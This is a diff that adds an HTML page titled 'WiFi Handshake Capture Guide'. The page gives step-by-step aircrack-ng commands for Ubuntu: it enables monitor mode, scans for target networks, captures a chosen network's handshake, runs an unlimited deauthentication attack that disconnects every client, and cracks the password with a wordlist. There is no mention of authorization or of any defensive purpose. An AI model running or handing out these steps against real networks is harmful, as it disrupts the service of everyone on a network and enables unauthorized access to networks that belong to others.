@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>WiFi Handshake file Capture Guide</title>
+    <style>
+      body {
+        font-family: "Arial", sans-serif;
+        background-color: #f7f7f7;
+        color: #333;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+
+      .container {
+        background-color: #fff;
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        max-width: 800px;
+        width: 100%;
+      }
+
+      h1 {
+        color: #3498db;
+      }
+
+      ol {
+        list-style: decimal;
+        padding-left: 20px;
+      }
+
+      li {
+        margin-bottom: 15px;
+      }
+
+      code {
+        background-color: #ecf0f1;
+        border: 1px solid #bdc3c7;
+        border-radius: 3px;
+        font-family: "Courier New", monospace;
+        padding: 0px 3px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>WiFi Handshake Capture Guide</h1>
+      <h3>For Ubuntu (Debian)</h3>
+
+      <ol>
+        <!-- Step 1 -->
+        <li>
+          <p>Find your WiFi adapter:</p>
+          <code>iwconfig</code>
+          <p>Write down the name of your adapter, e.g., <code>wlan0</code>.</p>
+        </li>
+
+        <!-- Step 2 -->
+        <li>
+          <p>Change the mode of the adapter:</p>
+          <code>airmon-ng start wlan0</code>
+          <p>If issues arise, restart the network:</p>
+          <code>systemctl restart NetworkManager</code>
+        </li>
+
+        <!-- Step 3 -->
+        <li>
+          <p>Check the current mode of your adapter:</p>
+          <code>iwconfig</code>
+        </li>
+
+        <!-- Step 4 -->
+        <li>
+          <p>Scan your area for target networks:</p>
+          <code>airodump-ng &lt;adapter-name&gt;</code>
+          <!-- Suppose your adapter name is wlan0mon -->
+        </li>
+
+        <!-- Step 5 -->
+        <li>
+          <p>After finding your network BSSID and channel name:</p>
+          <code
+            >airodump-ng &lt;adapter-name&gt; -c &lt;channel-number&gt; --bssid
+            &lt;BSSID&gt; -w handshake_file_name</code
+          >
+          <!-- Suppose WiFi is on channel 2 and BSSID is 10:27:F5:9A:B3:48 -->
+        </li>
+
+        <!-- Step 6 -->
+        <li>
+          <p>
+            Perform a DeAuth attack to disconnect everyone and capture the
+            handshake:
+          </p>
+          <code
+            >aireplay-ng --deauth 0 -a &lt;BSSID&gt; &lt;adapter-name&gt;</code
+          >
+          <!-- 0 means unlimited deAuth -->
+        </li>
+
+        <!-- Step 7 -->
+        <li>
+          <p>After capturing the handshake, turn off the monitor and DeAuth.</p>
+        </li>
+
+        <!-- Step 8 -->
+        <li>
+          <p>
+            Get a file with a <code>.cap</code> extension (this will be your
+            file name).
+          </p>
+        </li>
+
+        <!-- Step 9 -->
+        <li>
+          <p>Use a dictionary file for a dictionary attack:</p>
+          <code
+            >aircrack-ng -w wordlist.txt &lt;handshake_file_name&gt;.cap</code
+          >
+          <p>If the password matches, it will be displayed.</p>
+        </li>
+      </ol>
+    </div>
+  </body>
+</html>
